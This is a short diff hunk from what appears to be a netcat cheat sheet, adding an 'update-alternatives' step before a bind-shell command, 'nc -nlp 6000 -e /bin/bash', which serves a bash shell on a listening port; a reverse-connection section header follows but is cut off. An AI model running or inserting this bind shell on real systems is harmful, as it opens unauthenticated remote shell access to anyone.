@@ -23,6 +23,7 @@ nc -v site.com 80
 
 # Listen a TCP port
 # Need use package netcat-traditional
+update-alternatives --config nc
 nc -nlp 6000 -e /bin/bash
 
 # Reverse Conection to TCP port
